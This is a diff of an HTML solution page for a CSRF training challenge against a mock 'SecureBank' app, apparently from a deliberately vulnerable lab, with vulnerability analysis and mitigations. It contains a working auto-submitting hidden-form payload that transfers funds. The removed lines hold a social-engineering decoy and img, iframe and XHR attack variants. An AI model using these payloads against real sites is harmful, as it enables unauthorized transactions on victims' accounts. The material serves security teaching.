@@ -6,7 +6,7 @@
 <div class="row">
     <div class="col-md-10 offset-md-1">
         <div class="card">
-            <div class="card-header bg-success text-white">
+            <div class="card-header">
                 <h2 class="text-center">
                     <i class="bi bi-lightbulb-fill me-2"></i>
                     Level 1 Solution: Basic Form CSRF - SecureBank Attack
@@ -19,12 +19,18 @@
                 </div>
 
                 <div class="card mb-4">
-                    <div class="card-header bg-primary text-white">
-                        <h4 class="mb-0"><i class="bi bi-tools me-2"></i>Tools Required</h4>
+                    <div class="card-header">
+                        <h4 class="mb-0"><i class="bi bi-tools me-2"></i>Vulnerability Analysis</h4>
                     </div>
                     <div class="card-body">
-                        <p><strong>Primary Tools:</strong> Browser Developer Tools, Text Editor, Web Server (for hosting attack page)</p>
-                        <p><strong>Skills:</strong> HTML form manipulation, HTTP POST request analysis, Social engineering</p>
+                        <p>The SecureBank fund transfer form is vulnerable to CSRF attacks because:</p>
+                        <ul>
+                            <li><strong>No Anti-CSRF Tokens:</strong> The form doesn't include any unpredictable tokens that would validate the request's origin</li>
+                            <li><strong>No Origin/Referer Validation:</strong> The application doesn't verify where the request is coming from</li>
+                            <li><strong>Relies on Cookies:</strong> Authentication is handled via cookies which are automatically sent with cross-site requests</li>
+                            <li><strong>No SameSite Cookie Attributes:</strong> Cookies don't have SameSite restrictions to prevent cross-origin requests</li>
+                        </ul>
+                        <p>This makes it possible for an attacker to create a malicious page that submits a form to the vulnerable endpoint when visited by an authenticated user.</p>
                     </div>
                 </div>
 
@@ -35,20 +41,20 @@
                     <div class="card-body">
                         <ol>
                             <li><strong>Analyze Target Form:</strong> Inspect SecureBank's fund transfer form to identify the action URL, method, and required parameters</li>
-                            <li><strong>Identify Vulnerability:</strong> Confirm the form lacks CSRF tokens, referrer validation, or other protection mechanisms</li>
+                            <li><strong>Identify Required Parameters:</strong> The form requires "recipient" (account number), "amount" (transfer amount), and "memo" (transfer description)</li>
                             <li><strong>Create Attack Page:</strong> Build a malicious HTML page with a hidden form targeting the vulnerable endpoint</li>
-                            <li><strong>Set Attack Parameters:</strong> Configure the form to transfer funds to account "999999999" with any amount</li>
-                            <li><strong>Deploy Social Engineering:</strong> Trick authenticated users into visiting the malicious page</li>
-                            <li><strong>Execute Attack:</strong> The form auto-submits when the page loads, executing the unauthorized transfer</li>
+                            <li><strong>Set Attack Parameters:</strong> Configure the form to transfer funds to account "999999999" as specified in the challenge</li>
+                            <li><strong>Auto-Submit Form:</strong> Use JavaScript to automatically submit the form when the page loads</li>
+                            <li><strong>Deploy Social Engineering:</strong> In a real attack, trick authenticated users into visiting the malicious page</li>
                         </ol>
                         <div class="alert alert-warning mt-3">
-                            <strong>Key Insight:</strong> Without CSRF protection, any authenticated user who visits a malicious page can have actions performed on their behalf.
+                            <strong>Key Insight:</strong> Without CSRF protection, any authenticated user who visits a malicious page can have actions performed on their behalf without their knowledge or consent.
                         </div>
                     </div>
                 </div>
 
                 <div class="card mb-4">
-                    <div class="card-header bg-success text-white">
+                    <div class="card-header">
                         <h4 class="mb-0"><i class="bi bi-code-slash me-2"></i>CSRF Attack Payload</h4>
                     </div>
                     <div class="card-body">
@@ -58,34 +64,20 @@
     &lt;title&gt;You've Won a Prize!&lt;/title&gt;
 &lt;/head&gt;
 &lt;body&gt;
-    &lt;h2&gt;Congratulations! Click below to claim your $1000 prize!&lt;/h2&gt;
+    &lt;h2&gt;Congratulations! Your page is loading...&lt;/h2&gt;
     
-    &lt;!-- Visible form for social engineering --&gt;
-    &lt;form id="decoy-form"&gt;
-        &lt;button type="button" onclick="claimPrize()"&gt;Claim Prize Now!&lt;/button&gt;
-    &lt;/form&gt;
-    
-    &lt;!-- Hidden malicious form --&gt;
-    &lt;form id="csrf-attack" action="http://target.com/csrf/level1" method="post" style="display:none;"&gt;
+    &lt;!-- Hidden malicious form targeting SecureBank's transfer endpoint --&gt;
+    &lt;form id="csrf-attack" action="http://localhost:5000/csrf/level1" method="post" style="display:none;"&gt;
         &lt;input type="text" name="recipient" value="999999999"&gt;
         &lt;input type="number" name="amount" value="5000.00"&gt;
         &lt;input type="text" name="memo" value="Prize transfer"&gt;
+        &lt;input type="submit" value="Submit"&gt;
     &lt;/form&gt;
     
     &lt;script&gt;
-    function claimPrize() {
-        // Show loading message
-        document.body.innerHTML = '&lt;h3&gt;Processing your prize...&lt;/h3&gt;';
-        
-        // Execute CSRF attack
-        document.getElementById('csrf-attack').submit();
-    }
-    
-    // Auto-execute on page load (stealth mode)
+    // Auto-submit the form when the page loads
     window.onload = function() {
-        setTimeout(function() {
-            document.getElementById('csrf-attack').submit();
-        }, 2000); // Delay to avoid suspicion
+        document.getElementById('csrf-attack').submit();
     };
     &lt;/script&gt;
 &lt;/body&gt;
@@ -94,31 +86,7 @@
                 </div>
 
                 <div class="card mb-4">
-                    <div class="card-header bg-info text-white">
-                        <h4 class="mb-0"><i class="bi bi-terminal-fill me-2"></i>Alternative Attack Methods</h4>
-                    </div>
-                    <div class="card-body">
-                        <h5>1. Image-based Attack</h5>
-                        <pre class="bg-dark text-light p-2 rounded"><code>&lt;img src="http://target.com/csrf/level1?recipient=999999999&amount=5000" style="display:none;"&gt;</code></pre>
-                        
-                        <h5 class="mt-3">2. IFRAME-based Attack</h5>
-                        <pre class="bg-dark text-light p-2 rounded"><code>&lt;iframe src="http://target.com/csrf/level1" style="display:none;"&gt;
-&lt;form action="http://target.com/csrf/level1" method="post"&gt;
-    &lt;input name="recipient" value="999999999"&gt;
-    &lt;input name="amount" value="5000"&gt;
-&lt;/form&gt;
-&lt;/iframe&gt;</code></pre>
-
-                        <h5 class="mt-3">3. XMLHttpRequest Attack</h5>
-                        <pre class="bg-dark text-light p-2 rounded"><code>var xhr = new XMLHttpRequest();
-xhr.open('POST', 'http://target.com/csrf/level1');
-xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-xhr.send('recipient=999999999&amount=5000&memo=CSRF Attack');</code></pre>
-                    </div>
-                </div>
-
-                <div class="card mb-4">
-                    <div class="card-header bg-danger text-white">
+                    <div class="card-header">
                         <h4 class="mb-0"><i class="bi bi-shield-exclamation me-2"></i>Security Impact</h4>
                     </div>
                     <div class="card-body">
@@ -128,16 +96,15 @@ xhr.send('recipient=999999999&amount=5000&memo=CSRF Attack');</code></pre>
                             <li><strong>Account Manipulation:</strong> Perform unauthorized transactions without user knowledge</li>
                             <li><strong>Mass Exploitation:</strong> Scale attacks across multiple users through malicious websites or emails</li>
                             <li><strong>Reputational Damage:</strong> Undermine customer trust in the banking platform</li>
-                            <li><strong>Regulatory Violations:</strong> Breach financial security compliance requirements</li>
                         </ul>
                         <div class="alert alert-danger mt-3">
-                            <strong>Real-world Impact:</strong> A successful CSRF attack against a banking platform could result in millions in fraudulent transfers, massive customer lawsuits, and regulatory penalties.
+                            <strong>Real-world Impact:</strong> A successful CSRF attack against a banking platform could result in significant financial losses, customer lawsuits, and regulatory penalties.
                         </div>
                     </div>
                 </div>
 
                 <div class="card mb-4">
-                    <div class="card-header bg-success text-white">
+                    <div class="card-header">
                         <h4 class="mb-0"><i class="bi bi-shield-check me-2"></i>Mitigation Strategies</h4>
                     </div>
                     <div class="card-body">
@@ -153,13 +120,12 @@ xhr.send('recipient=999999999&amount=5000&memo=CSRF Attack');</code></pre>
                             <li><strong>Origin Header Validation:</strong> Verify Origin and Referer headers match expected domains</li>
                             <li><strong>Custom Request Headers:</strong> Require X-Requested-With headers for AJAX requests</li>
                             <li><strong>Transaction Verification:</strong> Implement email/SMS confirmation for sensitive operations</li>
-                            <li><strong>Content Security Policy:</strong> Use CSP to restrict form submissions to trusted domains</li>
                         </ul>
 
                         <div class="alert alert-success mt-3">
                             <strong>Secure Implementation Example:</strong>
                             <pre class="mt-2"><code>&lt;form action="/transfer" method="post"&gt;
-    &lt;input type="hidden" name="csrf_token" value="{{ csrf_token }}"&gt;
+    &lt;input type="hidden" name="csrf_token" value="{{ "{{ csrf_token }}" }}"&gt;
     &lt;input type="text" name="recipient" required&gt;
     &lt;input type="number" name="amount" required&gt;
     &lt;button type="submit"&gt;Transfer Funds&lt;/button&gt;
@@ -174,9 +140,6 @@ xhr.send('recipient=999999999&amount=5000&memo=CSRF Attack');</code></pre>
                     </a>
                     <a href="/csrf/level2" class="btn btn-success">
                         <i class="bi bi-arrow-right me-1"></i>Next Challenge
-                    </a>
-                    <a href="/challenges" class="btn btn-info ms-2">
-                        <i class="bi bi-list me-1"></i>All Challenges
                     </a>
                 </div>
             </div>
